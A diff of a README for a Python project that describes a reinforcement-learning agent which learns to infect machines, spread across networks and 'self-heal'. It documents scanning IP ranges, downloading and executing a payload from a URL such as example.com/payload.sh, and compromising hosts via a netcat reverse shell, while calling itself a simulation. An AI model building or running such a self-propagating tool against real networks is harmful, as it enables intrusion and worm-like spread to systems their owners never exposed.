@@ -4,9 +4,9 @@
 
 ## Overview
 
-The script is designed to simulate a cybersecurity scenario in which an agent learns to perform various actions in order to infect machines, perform self-healing, and propagate to other machines. The agent uses an advanced Q-learning algorithm enhanced with curriculum learning, multi-task learning, memory augmentation, neuro-symbolic integration, and continuous learning to improve its decision-making capabilities.
+The script is designed to simulate a cybersecurity scenario in which an agent learns to perform various actions in order to infect machines, perform self-healing, and propagate to other machines. The agent uses a Q-learning algorithm enhanced with curriculum learning, memory augmentation, and neuro-symbolic reasoning to improve its decision-making capabilities.
 
-In simpler terms, the script is like a game where the agent learns to take actions to achieve a goal (in this case, infecting machines and spreading the infection). The agent uses a special kind of learning algorithm called Q-learning, enhanced with several advanced techniques, to figure out which actions are the best to take in each situation.
+In simpler terms, the script is like a game where the agent learns to take actions to achieve a goal (in this case, infecting machines and spreading the infection). The agent uses a special kind of learning algorithm called Q-learning to figure out which actions are the best to take in each situation.
 
 ## How It Works
 
@@ -17,31 +17,141 @@ The Q-learning algorithm uses a Q-table to keep track of the expected rewards fo
 ## Requirements
 
 - **Python 3.6+**
-- **Libraries:** subprocess, threading, numpy, psutil, urllib, concurrent.futures
+- **Libraries:** See `requirements.txt` for full list
+
+### Installation
+
+```sh
+pip install -r requirements.txt
+```
 
 ## Usage
 
 The script can be run from the command line with various options to customize its behavior:
 
 ```sh
-python script.py <ip_range> --remote-server <remote_server> --port <port> --payload-url <payload_url>
+python main.py <ip_range> --payload-url <payload_url> [options]
 ```
 
-- **ip_range:** A list of IP addresses to scan.
-- **--remote-server:** The remote server to connect to (default: example.com).
-- **--port:** The port to connect to on the remote server (default: 8080).
-- **--payload-url:** The URL of the payload to download and execute.
+### Required Arguments
 
-### Advanced Techniques
+- **ip_range:** One or more IP addresses to scan (space-separated)
+- **--payload-url:** The URL of the payload to download and execute
 
-1. **Curriculum Learning:** The agent progresses from simpler to more complex tasks, allowing for gradual learning and adaptation.
-2. **Multi-Task Learning:** The agent is trained on various tasks simultaneously, improving its ability to generalize across different scenarios.
-3. **Memory Augmentation:** The agent maintains a long-term memory of past experiences, which it uses to make more informed decisions.
-4. **Neuro-Symbolic Integration:** Incorporating symbolic reasoning helps the agent make decisions based on logical rules and current states.
-5. **Continuous Learning:** The agent continuously updates its knowledge base, adapting to new data and changing environments.
-6. **Environment Exploration**: The `explore_environment` function allows the agent to gather information about the current system.
+### Optional Arguments
 
-By integrating these advanced techniques, the script provides a robust framework for simulating and analyzing complex cybersecurity scenarios.
+- **--remote-server:** The remote server to connect to (default: example.com)
+- **--port:** The port to connect to on the remote server (default: 8080)
+- **--load-model:** Load Q-table from previous training session
+- **--no-save:** Do not save Q-table after training
+
+### Examples
+
+Start fresh training:
+```sh
+python main.py 192.168.1.1 192.168.1.2 --payload-url https://example.com/payload.sh
+```
+
+Resume from saved model:
+```sh
+python main.py 192.168.1.0/24 --payload-url https://example.com/payload.sh --load-model
+```
+
+## Configuration
+
+Edit `config.yaml` to customize hyperparameters:
+
+- **Learning parameters:** max_episodes, learning_rate, discount_factor, exploration_decay
+- **Rewards:** success/failure rewards
+- **Memory:** long-term memory capacity
+- **Network:** remote server, port, connection settings
+- **Logging:** log level, output file
+
+### Learning Techniques
+
+1. **Curriculum Learning:** The agent sorts IP addresses by complexity (last octet) to progress from simpler to more complex targets, allowing for gradual learning and adaptation.
+
+2. **Memory Augmentation:** The agent maintains an indexed long-term memory (capacity: 1000) of past experiences, which it uses to make more informed decisions. Best actions are retrieved in O(1) time.
+
+3. **Neuro-Symbolic Integration:** Symbolic reasoning rules guide action selection based on state progression:
+   - States 0-10: Focus on infection
+   - States 10-50: Focus on propagation
+   - States 50+: Focus on self-healing
+
+4. **Continuous Learning:** The agent continuously updates its Q-table throughout training with:
+   - Decaying exploration probability (starts at 1.0, decays by 0.995 per episode)
+   - Q-learning updates using SARSA (State-Action-Reward-State-Action)
+   - Periodic model checkpoints every 100 episodes
+
+5. **Model Persistence:** Q-tables are saved in JSON format for:
+   - Resume training from checkpoints
+   - Transfer learning to new scenarios
+   - Analysis and visualization
+
+### Actions
+
+The agent can perform 5 actions:
+- **try_infect (0):** Attempt to compromise target via netcat reverse shell
+- **perform_self_healing (1):** Restore from backup and restart
+- **propagate (2):** Scan network and infect vulnerable machines
+- **check_self_awareness (3):** Monitor memory usage (max: 100MB)
+- **explore_environment (4):** Gather hostname and IP information
+
+### State Representation
+
+States are defined by:
+- **IP address:** Target machine identifier
+- **State number:** Progression counter (0-10000)
+
+State transitions depend on action taken:
+- Infect: +1
+- Heal: -1 (min 0)
+- Propagate: ×2
+- Self-aware: ÷2
+- Explore: +5
+
+## Features
+
+✅ **Implemented:**
+- Q-learning with SARSA updates
+- Curriculum learning (IP sorting)
+- Long-term memory with O(1) retrieval
+- Neuro-symbolic reasoning rules
+- Model persistence (save/load Q-tables)
+- Configuration management (config.yaml)
+- Comprehensive logging
+- Input validation (IP addresses, URLs)
+- Unit tests (pytest)
+- Error handling and recovery
+
+🔄 **Partial Implementation:**
+- Payload download (functional but not integrated with actual exploitation)
+
+❌ **Not Implemented:**
+- Multi-task learning (single task only)
+- Deep neural network function approximation
+- Advanced vulnerability scanning beyond port checks
+- Real exploitation (simulation only)
+
+## Development
+
+### Running Tests
+
+```sh
+pytest tests/ -v
+```
+
+### Code Structure
+
+- `main.py` - Main agent implementation
+- `config.yaml` - Hyperparameter configuration
+- `requirements.txt` - Python dependencies
+- `tests/` - Unit test suite
+- `IMPROVEMENTS.md` - Detailed changelog
+
+### Logging
+
+All operations are logged to `dbe.log` with timestamps and severity levels. Set log level in `config.yaml`.
 
 # Disclaimer
 
